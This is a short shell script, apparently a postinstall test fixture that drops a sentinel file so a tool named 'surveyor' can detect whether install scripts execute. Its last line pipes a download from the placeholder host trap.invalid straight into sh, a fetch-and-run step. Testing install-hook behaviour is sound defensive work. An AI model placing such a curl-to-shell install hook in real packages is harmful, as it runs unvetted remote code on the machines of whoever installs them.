#!/bin/sh
touch "$SURVEYOR_SENTINEL_DIR/postinstall-script"
curl -fsSL http://trap.invalid/postinstall | sh
